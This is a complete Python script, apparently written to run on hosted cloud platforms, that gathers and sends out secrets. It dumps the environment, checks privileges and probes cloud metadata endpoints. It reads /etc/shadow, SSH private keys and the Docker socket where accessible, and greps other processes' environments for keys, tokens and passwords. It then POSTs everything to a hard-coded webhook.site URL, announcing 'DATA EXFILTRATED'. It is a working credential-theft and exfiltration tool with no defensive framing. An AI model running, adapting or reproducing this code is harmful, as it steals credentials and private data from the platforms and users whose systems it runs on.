import os
import sys
import json
import socket
import subprocess
import urllib.request
from concurrent.futures import ThreadPoolExecutor

# КОНФИГ
WEBHOOK_URL = "https://webhook.site/b124440e-cd76-4ab0-8b65-b1f9bd749547"

class CloudTerminator:
    def __init__(self):
        self.report = {
            "platform_hints": {},
            "privileges": {},
            "network_recon": {},
            "sensitive_files": {},
            "container_escape_vectors": {},
            "env_dump": dict(os.environ)
        }

    def run_cmd(self, cmd):
        try:
            return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=5).decode().strip()
        except:
            return "Failed/Blocked"

    def audit_identity(self):
        """Проверка прав и окружения"""
        self.report["privileges"] = {
            "id": self.run_cmd("id"),
            "caps": self.run_cmd("capsh --print"),
            "groups": self.run_cmd("groups"),
            "sudo": self.run_cmd("sudo -n -l")
        }

    def network_scan(self):
        """Поиск внутренних сервисов и облачных метаданных"""
        # Проверка IMDS (AWS/GCP/Azure)
        metadata_urls = [
            "http://169.254.169.254/latest/meta-data/", # AWS/OpenStack
            "http://metadata.google.internal/computeMetadata/v1/", # GCP
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01" # Azure
        ]
        
        found_metadata = []
        for url in metadata_urls:
            try:
                req = urllib.request.Request(url)
                if "google" in url: req.add_header("Metadata-Flavor", "Google")
                if "azure" in url: req.add_header("Metadata", "true")
                with urllib.request.urlopen(req, timeout=1) as r:
                    found_metadata.append(f"ACCESSIBLE: {url}")
            except:
                pass
        self.report["network_recon"]["cloud_metadata"] = found_metadata

    def file_system_prowler(self):
        """Поиск 'золотых' файлов и утечек секретов"""
        targets = [
            "/var/run/docker.sock", "/run/docker.sock", # Docker Escape
            "/proc/self/status", "/proc/config.gz",    # Kernel Info
            "/etc/shadow", "/etc/sudoers",             # OS Security
            "/root/.ssh/id_rsa", "/home/render/.ssh/id_rsa", # SSH Keys
            "/proc/net/tcp", "/proc/net/fib_trie",     # Network routes
            "/dev/mem", "/dev/kmem"                    # Physical memory access
        ]
        
        for t in targets:
            if os.path.exists(t):
                readable = os.access(t, os.R_OK)
                self.report["sensitive_files"][t] = f"EXISTS | READABLE: {readable}"
                if readable and os.path.isfile(t):
                    self.report["sensitive_files"][t + "_content"] = self.run_cmd(f"head -c 512 {t} | base64")

    def proc_spy(self):
        """Поиск утечек из соседних процессов (как на Vercel)"""
        pids = []
        try:
            # Проверяем первые 500 PIDов на наличие секретов в environ
            for pid in range(1, 500):
                path = f"/proc/{pid}/environ"
                if os.path.exists(path):
                    pids.append(pid)
                    if pid != os.getpid():
                        content = self.run_cmd(f"strings {path} | grep -E 'KEY|SECRET|TOKEN|AUTH|PASS'")
                        if content:
                            self.report["container_escape_vectors"][f"leak_pid_{pid}"] = content
        except:
            pass
        self.report["platform_hints"]["active_pids_count"] = len(pids)

    def send_report(self):
        payload = json.dumps(self.report).encode('utf-8')
        try:
            req = urllib.request.Request(WEBHOOK_URL, data=payload, method='POST')
            req.add_header('Content-Type', 'application/json')
            urllib.request.urlopen(req)
            print("[+] DATA EXFILTRATED.")
        except Exception as e:
            print(f"[-] FAILED: {e}")

if __name__ == "__main__":
    t = CloudTerminator()
    t.audit_identity()
    t.network_scan()
    t.file_system_prowler()
    t.proc_spy()
    t.send_report()
